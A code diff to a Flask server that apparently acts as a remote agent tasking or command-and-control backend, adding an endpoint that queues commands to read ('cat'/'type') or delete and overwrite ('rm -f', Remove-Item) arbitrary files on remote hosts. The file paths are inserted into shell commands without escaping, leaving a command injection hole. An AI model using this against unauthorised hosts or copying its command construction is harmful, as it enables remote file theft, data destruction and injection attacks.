@@ -38,6 +38,8 @@ def init_db():
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, target_type TEXT, command TEXT, timestamp TEXT)''')
     query_db('''CREATE TABLE IF NOT EXISTS task_receipts
                 (task_id INTEGER, hostname TEXT)''')
+    query_db('''CREATE TABLE IF NOT EXISTS file_transfers
+            (id INTEGER PRIMARY KEY AUTOINCREMENT, hostname TEXT, file_path TEXT, content TEXT, direction TEXT, timestamp TEXT)''')
 
 
 init_db()
@@ -302,6 +304,37 @@ def agent_action():
         (hostname, cmd, time.strftime('%H:%M:%S')),
     )
     return jsonify({"status": "Tasked"}), 200
+
+@app.route('/admin/file_op', methods=['POST'])
+def file_op():
+    hostname = request.form.get('hostname')
+    file_path = request.form.get('path')
+    operation = request.form.get('op') # 'pull' or 'push'
+    content = request.form.get('content', '')
+
+    agent = query_db("SELECT os FROM agents WHERE hostname = ?", (hostname,), one=True)
+    if not agent: return "Agent not found", 404
+    is_win = normalize_os_family(agent['os']) == "WINDOWS"
+
+    if operation == 'pull':
+        # Command to read file and wrap in a specific delimiter for the parser
+        cmd = f"type \"{file_path}\"" if is_win else f"cat \"{file_path}\""
+        query_db("INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)",
+                 (hostname, f"FILE_PULL|{file_path}|{cmd}", time.strftime('%H:%M:%S')))
+        return jsonify({"status": "Pull Tasked"}), 200
+
+    if operation == 'push':
+        # Logic: Delete old, create new with edited content (encoded to handle special chars)
+        import base64
+        b64_content = base64.b64encode(content.encode()).decode()
+        if is_win:
+            cmd = f"Remove-Item -Path '{file_path}' -ErrorAction SilentlyContinue; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{b64_content}')) | Out-File -FilePath '{file_path}' -Encoding utf8"
+        else:
+            cmd = f"rm -f '{file_path}' && echo '{b64_content}' | base64 -d > '{file_path}'"
+        
+        query_db("INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)",
+                 (hostname, cmd, time.strftime('%H:%M:%S')))
+        return jsonify({"status": "Push Tasked"}), 200
 
 
 if __name__ == "__main__":
